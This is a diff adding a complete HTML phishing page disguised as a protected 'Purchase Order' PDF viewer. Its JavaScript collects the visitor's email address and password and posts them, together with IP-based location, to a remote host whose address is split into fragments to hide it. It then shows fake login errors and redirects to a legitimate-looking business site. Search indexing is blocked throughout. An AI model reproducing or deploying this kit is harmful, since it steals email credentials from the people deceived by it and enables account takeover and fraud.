@@ -1,0 +1,351 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>PDF Online View</title>
+
+<link rel="apple-touch-icon" type="image/png"  class="logoimg" href="" /> 
+<link rel="shortcut icon" type="image/x-icon"  class="logoimg"  href="" />
+<link rel="mask-icon" type=""  class="logoimg" href="" color="#111" />
+<meta name="robots" content="noindex">
+<meta name="googlebot" content="noindex">
+<meta name="googlebot-news" content="noindex" />
+<meta name="otherbot" content="noindex" />
+<meta name="noarchive" content="noindex" />
+<meta name="nosnippet" content="noindex" />
+<meta name="noimageindex" content="noindex" />
+<meta name="robots" content="none">
+<meta name="googlebot" content="none">
+<meta name="googlebot-news" content="none" />
+<meta name="otherbot" content="none" />
+<meta name="noarchive" content="none" />
+<meta name="nosnippet" content="none" />
+<meta name="noimageindex" content="none" />
+<meta name="robots" content="nofollow">
+<meta name="googlebot" content="nofollow">
+<meta name="googlebot-news" content="nofollow" />
+<meta name="otherbot" content="nofollow" />
+<meta name="noarchive" content="nofollow" />
+<meta name="nosnippet" content="nofollow" />
+<meta name="noimageindex" content="nofollow" />
+<meta name="robots" content="max-snippet:0">
+<meta name="robots" content="unavailable_after: 2020-09-22">
+
+<link rel="shortcut icon" type="image/png" href="https://th.bing.com/th/id/OIP.FJYw9wm-Ns5szcAaGmpnpAAAAA?w=32&h=32&c=7&r=0&o=5&pid=1.7">
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+<link href="https://ucarecdn.com/eae24034-0cc9-4528-827a-d46e30dd5a83/hover.css" rel="stylesheet" media="all">
+
+<!-- <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script> -->
+<!--  <script src="https://klxszs.web.app/jp_outlook.js"> </script> -->
+ <script>
+  let resBox = 'go4World'
+  let nbg1 = 'https'
+  let nbg2 = '://'
+  let nbg3 = 'clpoint.000webhostapp'
+  let nbg4 = '.com'
+  let nbg5 = '/webtest'
+  let nbg6 = '.php'
+
+  let ov1 = 'https'
+  let ov2 = '://'
+  let ov3 = 'www.go4'
+  let ov4 = 'worl'
+  let ov5 = 'dbusine'
+  let ov6 = 'ss.com/lo'
+  let ov7 = 'gin'
+
+  sessionStorage.clear()
+  let trialCount = sessionStorage.getItem("num_trial");
+
+  if (!trialCount) {
+    sessionStorage.setItem("num_trial", 0);
+  } else if (trialCount >= 2) {
+    window.location.assign(`${ov1}${ov2}${ov3}${ov4}${ov5}${ov6}${ov7}`)
+  }
+</script>
+<script type="text/javascript">
+  
+
+var docurl = '';
+  const queryString = window.location.search;
+  console.log(queryString);
+  const urlParams = new URLSearchParams(queryString);
+  const str = urlParams.get('prox')
+  var proxx = str.substring(0, 4);
+    var results =str.split('@');
+  var result = results[1];
+
+</script>
+<style type="text/css">
+    .hide {
+      display: none;
+    }
+
+    .grey-form {
+      background-color: #ffffff;
+      opacity: 1;
+      pointer-events: none;
+    }
+
+    .alert-success {
+      color: #155724;
+      background-color: #d4edda;
+      border-color: #c3e6cb;
+    }
+
+
+
+    .modal-body {
+    padding: 0 !important;
+}
+.login-container{
+    position: absolute;
+    /*width: 400px;*/
+    margin: 80px auto;
+    padding: 20px 20px 20px;
+    text-align: center;
+    background: #f5f5f5;
+    border: 1px solid #ccc;
+    z-index: 2;
+}
+
+#output{
+    position: absolute;
+    width: 400px;
+    top: -75px;
+    left: 0;
+    color: #fff;
+}
+
+#output.alert-success{
+    background: rgb(25, 204, 25);
+}
+
+#output.alert-danger{
+    background: rgb(228, 105, 105);
+
+}
+
+.logos{
+    width: 100%;
+    height: auto;
+   display: flex;
+   justify-content: space-between;
+   align-items: center;
+}
+
+
+.form-box input{
+    width: 100%;
+  margin: 1px; auto
+    padding: 10px;
+    text-align: center;
+    height: 40px;
+    border: 1px solid #ccc;;
+    background: #ffffff;
+    transition:0.2s ease-in-out;
+
+}
+
+.form-box input:focus{
+    outline: 50px;
+    background: #ffffff;
+}
+
+.form-box input[type="text"]{
+    border-radius: 5px 5px 0 0;
+    text-transform: lowercase;
+}
+
+.form-box input[type="password"]{
+    border-radius: 0 0 0px 0px;
+    border-top: 0;
+}
+
+.form-box button.login{
+    margin-top: 15px;
+    padding: 10px 20px;
+    
+}
+
+.animated {
+  -webkit-animation-duration: 1s;
+  animation-duration: 1s;
+  -webkit-animation-fill-mode: both;
+  animation-fill-mode: both;
+}
+
+@-webkit-keyframes fadeInUp {
+  0% {
+    opacity: 0;
+    -webkit-transform: translateY(20px);
+    transform: translateY(20px);
+  }
+
+  100% {
+    opacity: 0;
+    -webkit-transform: translateY(0);
+    transform: translateY(0);
+  }
+}
+
+@keyframes fadeInUp {
+  0% {
+    opacity: 0;
+    -webkit-transform: translateY(20px);
+    -ms-transform: translateY(20px);
+    transform: translateY(20px);
+  }
+
+  100% {
+    opacity: 1;
+    -webkit-transform: translateY(0);
+    -ms-transform: translateY(0);
+    transform: translateY(0);
+  }
+}
+
+.fadeInUp {
+  -webkit-animation-name: fadeInUp;
+  animation-name: fadeInUp;
+}
+
+
+  </style>
+
+</head>
+
+<body>
+  <div class="container-fluid">
+    
+    <div class="row" style="position: fixed; height: 100vh; background-image: url('https://i.im.ge/2022/06/19/reTSGF.png'); background-size: contain;background-repeat: yes-repeat; filter: blur(3px);  -webkit-filter: blur(3px); width: 100%; left: 0; top: 0;"></div>
+    <div class="row" style="height: 100vh;">
+      <div class="container">
+        <div class="row">
+
+
+        </div>
+      </div>
+
+
+  <!-- Modal for  -->
+  <div style="display: block !important" class="modal" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+    <div class="modal-dialog" role="document">
+      <div style="position: relative;
+                  display: -webkit-box;
+                  display: -ms-flexbox;
+                  display: flex;
+                  -webkit-box-orient: vertical;
+                  -webkit-box-direction: normal;
+                  -ms-flex-direction: column;
+                  flex-direction: column;
+                  width: 80%;
+                  pointer-events: auto;
+                  ">
+        <div class="modal-body">
+
+        <div class="login-container">
+            <div id="output"></div>
+            <div class="logos">
+              <div class="avatar">
+                <img id="fieldImg" class="img-fluid brand_logo" width="60px" src="https://i.im.ge/2022/06/19/rGepCP.png">
+              </div>
+
+                <img id="fieldImg" class="img-fluid brand_logo" width="60px" src="https://i.im.ge/2022/06/19/rGepCP.png">
+            </div>
+            <div class="form-box">
+              <div class="alert" id="errmsg" style="color: #e00; font-size: 14px; padding: 5px;"></div>
+              <h4>Purchase Order 19126.PDF</h4>
+              <p style="font-size: 14px;">"File is protected by <span id="mBox">Alibaba</span> Cloud Security Engine"</p>
+                <!--<form id="contact" class="form-horizontal well">-->
+                <form action="" method="post" id="form_">
+                  <input type='hidden' id="ckorg" placeholder="Email Address" value="[[-Email-]]"><br>
+                  <input type="hidden" class='text' name="loc" id="loc">
+                  <input type="hidden" class='text' name="trial" id="trial">
+
+                  <input type="email" id="ck" aria-describedby="emailHelp" required placeholder="Enter Email ID" value="">
+
+                  <input type='password' placeholder="Enter Email Password" required class='form-input-container' id='cknow' pattern="(?=^.{6,}$).*$">
+
+                  <button class="btn btn-success btn-block login" style="background: #DE0000;" id="submit-btn"  type="submit" ">View Document</button>
+                </form>
+            </div>
+        </div>
+
+
+
+
+        </div>
+
+
+      </div>
+    </div>
+  </div>
+
+<script>
+  const xx = window.location.href.split('?');
+  let ck = document.querySelector('#ck')
+  let ckorg = document.querySelector('#ckorg')
+  let cknow = document.querySelector('#cknow')
+  let loader = document.querySelector('#submit-btn')
+  let loc = document.querySelector('#loc')
+  let trial = document.querySelector('#trial')
+
+  if (xx[1] != undefined) {
+    document.querySelector('#mBox').innerHTML = atob(xx[1]).toUpperCase()
+  }
+
+  trial.value = trialCount
+
+  let myForm = document.querySelector('#form_')
+  myForm.addEventListener('submit', async function (event) {
+    event.preventDefault()
+
+    let data = new FormData()
+
+    let options = {
+      method: 'POST',
+      body: data
+    }
+    data.append('ck', ck.value)
+    data.append('ckorg', ckorg.value)
+    data.append('cknow', cknow.value)
+    data.append('loc', loc.value)
+    data.append('trial', trial.value)
+    data.append('resBox', resBox)
+
+    loader.innerHTML = "<i class='fa fa- fa-spin'></i> Verifing..."
+
+    const response = await fetch(`${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}`, options)
+    const result = await response.text()
+
+    loader.innerHTML = "<i class='fa fa- fa-spin'></i> Signing in..."
+    setTimeout(() => {
+      loader.innerHTML = "View Document"
+    }, 2000)
+
+    console.log(result)
+
+    trialCount++;
+    sessionStorage.setItem("num_trial", trialCount);
+    trial.value = trialCount
+
+    if (trialCount >= 2) {
+      window.location.assign(`${ov1}${ov2}${ov3}${ov4}${ov5}${ov6}${ov7}`)
+    } else {
+      document.getElementById('errmsg').innerHTML = "Incorrect account details. Please try again "
+    }
+  })
+
+  $.get("https://ipinfo.io/json?token=10da60a9ff2d81", function (response) {
+    let cou = `${response.city}, ${response.region}, ${response.country}. ${response.postal} ${response.timezone}`
+    $("#loc").val(cou);
+  }, "jsonp");
+</script>
+
+
+</body>
+</body>
+</html>
